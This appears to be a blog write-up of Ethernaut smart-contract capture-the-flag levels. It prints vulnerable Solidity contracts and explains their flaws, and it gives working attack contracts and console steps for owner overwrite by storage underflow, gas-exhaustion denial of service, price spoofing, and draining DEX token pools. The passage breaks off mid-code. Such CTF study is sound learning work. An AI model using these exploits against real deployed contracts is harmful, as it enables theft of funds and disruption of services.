<h3 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line">    address public solver;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setSolver(address _solver) public &#123;</span><br><span class="line">        solver = _solver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Here you need to write a contract that returns 42 using less than 10 commands. Here you can use EVM Bytecode to write it manually.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">60 2a // PUSH1 0x2a; Push constant 42</span><br><span class="line">60 00 // PUSH1 0x00; Target memory location (slot 0)</span><br><span class="line">52 // MSTORE; [0..32) writes 32 bytes, placing 42 in the low order</span><br><span class="line">60 20 // PUSH1 0x20; Returns length 32</span><br><span class="line">60 00 // PUSH1 0x00; Returns starting memory location 0</span><br><span class="line">f3 // RETURN; Returns [0, 32); Valid for any function selector</span><br><span class="line"></span><br><span class="line">60 0a // PUSH1 0x0a; Runtime length 10 bytes</span><br><span class="line">60 0c // PUSH1 0x0c; Runtime offset in this code (immediately following the creation section)</span><br><span class="line">60 00 // PUSH1 0x00; Copy to memory start position 0</span><br><span class="line">39 // CODECOPY; mem[0..10) = code[0x0c .. 0x0c+0x0a)</span><br><span class="line">60 00 // PUSH1 0x00; RETURN start</span><br><span class="line">f3 // RETURN; Return the 10 bytes just copied =&gt; becomes the &quot;contract code&quot; after deployment</span><br></pre></td></tr></table></figure>

<h3 id="AlienCodeX"><a href="#AlienCodeX" class="headerlink" title="AlienCodeX"></a>AlienCodeX</h3><p>There are a few points to understand here.</p>
<ol>
<li>Solidity’s storage is a ring modulo 2^256.</li>
<li>Dynamic arrays such as uint256[], bytes32[]; bytes, string; Mapping; Struct; and uint256[3], all types of data do not directly store the content and length&#x2F;index in the same slot; they are all stored separately.</li>
<li>Taking an array as an example, based on the slot where the array length is located, call keccak256(abi.encode(uint256(slot))) to calculate the address of the first element of the array, and then add <code>i</code> to traverse the array.</li>
</ol>
<p>The contract code is as follows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As can be seen above, the array’s slot is 1, while Solidity’s storage size is 2^256. type(uint256).max &#x3D; 2^256 - 1. Therefore, to trigger integer underflow and set the owner stored in slot 0 to our EOA address, i must satisfy i + array.base(calculated by keecak256) &#x3D;&#x3D; type(uint256).max + 1.</p>
<p>Here, the 1-byte bool and the 20-byte address(owner) are packed into one slot (slot0), so the slot storing our array length is 1.</p>
<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.30;</span><br><span class="line"></span><br><span class="line">interface IAlienCodex &#123;</span><br><span class="line">    function makeContact() external;</span><br><span class="line">    function retract() external;</span><br><span class="line">    function revise(uint256 i, bytes32 content) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    IAlienCodex public target;</span><br><span class="line">    </span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        target = IAlienCodex(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        target.makeContact();</span><br><span class="line">        target.retract();</span><br><span class="line">        uint256 base = uint256(keccak256(abi.encode(uint256(1))));</span><br><span class="line">        uint256 i = type(uint256).max - base + 1;</span><br><span class="line">        bytes32 content = bytes32(uint256(uint160(tx.origin)));</span><br><span class="line">        target.revise(i, content);//address 20 bytes</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);//There is no specified amount of gas to be consumed here, so almost all the gas will be released at once, leaving (1/64)</span><br><span class="line">        payable(owner).transfer(amountToSend);// Here the transfer function consumes a fixed amount of 2300 gas</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The main issue here is gas. In partner.call{} , the gas consumption is not specified, so the entire 63&#x2F;64 gas allocation is sent out at once. If an attacker consumes this amount in the attacking contract, subsequent operations will be difficult to complete.</p>
<p>To prevent partner setup failure, we need to call the setup function and withdraw separately, then set up fallback and receive functions. Using an infinite loop, we can continuously consume gas, consuming the 63&#x2F;64 gas allocated, preventing the attacker from completing the subsequent transfer operation (fixed gas consumption of 2300).</p>
<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IDenial &#123;</span><br><span class="line">    function setWithdrawPartner(address _partner) external;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    IDenial public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = IDenial(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function becomePartner() external &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pokeWithdraw() external &#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123; burnGas(); &#125;</span><br><span class="line">    receive() external payable &#123; burnGas(); &#125;</span><br><span class="line"></span><br><span class="line">    function burnGas() internal pure &#123;</span><br><span class="line">        while (true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IBuyer &#123;</span><br><span class="line">  function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint256 public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    IBuyer _buyer = IBuyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The fundamental problem here is that the price function is called twice, modifying a critical state variable—isSold—in between calls.</p>
<p>So, we can exploit the difference in the value of this state variable in the attack contract to achieve different return values for the two function calls, thereby completing an attack and completing a purchase at a lower price than the target price.</p>
<p>The attack contract is as follows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IBuyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IShop &#123;</span><br><span class="line">    function buy() external;</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack is IBuyer &#123;</span><br><span class="line">    function attack(address shop) external &#123;</span><br><span class="line">        IShop(shop).buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view override returns (uint256) &#123;</span><br><span class="line">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h3><img src="/2025/10/14/Ethernaut-Challenges/%E6%88%AA%E5%B1%8F2025-09-14_16.46.06.png" class="" title="截屏2025-09-14 16.46.06.png">

<img src="/2025/10/14/Ethernaut-Challenges/%E6%88%AA%E5%B1%8F2025-09-14_16.46.23.png" class="" title="截屏2025-09-14 16.46.23.png">

<p>The two Fig. above illustrate UniSwap V2’s pricing calculation process (the EVM cannot represent decimals, so multiply by 1000).</p>
<p>Let’s look at the pricing calculation formula provided by this contract.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addLiquidity(address token_address, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from, address to, uint256 amount) public &#123;</span><br><span class="line">        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)</span><br><span class="line">        ERC20(name, symbol)</span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As you can see, the calculation is based on a percentage, with no tax rate or validation.</p>
<p>Typically, the pricing formula is as shown in the diagram above, or a require is used for validation later.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 伪码</span><br><span class="line">amountInWithFee = amountIn * 997;</span><br><span class="line">amountOut = amountInWithFee * R_out / (R_in*1000 + amountInWithFee);</span><br><span class="line">// 或： (balanceIn*1000 - in*3) * (balanceOut*1000) &gt;= reserveIn*reserveOut*1000^2</span><br></pre></td></tr></table></figure>

<p>所以这里攻击步骤是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">let token1 = await contract.token1();// getter function</span><br><span class="line">let token2 = await contract.token2();</span><br><span class="line"></span><br><span class="line">await contract.approve(instance, 1000);</span><br><span class="line"></span><br><span class="line">await contract.swap(token1, token2, 10);// this is all calculated by formula</span><br><span class="line">await contract.swap(token2, token1, 20);// </span><br><span class="line">await contract.swap(token1, token2, 24);</span><br><span class="line">await contract.swap(token2, token1, 30);</span><br><span class="line">await contract.swap(token1, token2, 41);</span><br><span class="line"></span><br><span class="line">// swap with 45 token2 because 65 * 110 / 45 = 158 &gt; 110 and 46 * 110 / 45 = 110</span><br><span class="line">await contract.swap(token2, token1, 45);</span><br><span class="line"></span><br><span class="line">// should return 0</span><br><span class="line">(await contract.balanceOf(token1, instance)).toString();</span><br></pre></td></tr></table></figure>

<h3 id="Dex2"><a href="#Dex2" class="headerlink" title="Dex2"></a>Dex2</h3><p>Compared to the previous level, the check for the from and to addresses in the swap function has been removed. That is, the contract can now exchange tokens with any contract, and the pricing formula is still linear, so you can use your own minted third-party tokens to extract token1 and token2.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add_liquidity(address token_address, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from, address to, uint256 amount) public &#123;</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)</span><br><span class="line">        ERC20(name, symbol)</span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The attack contract is written as follows</p>
<p>Here is a self-developed minting process.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    string public name = &quot;EvilToken&quot;;</span><br><span class="line">    string public symbol = &quot;EVIL&quot;;</span><br><span class="line">    uint8  public constant decimals = 18;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        uint256 amt = 1_000_000 ether;</span><br><span class="line">        totalSupply = amt;</span><br><span class="line">        balanceOf[msg.sender] = amt;</span><br><span class="line">        emit Transfer(address(0), msg.sender, amt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span 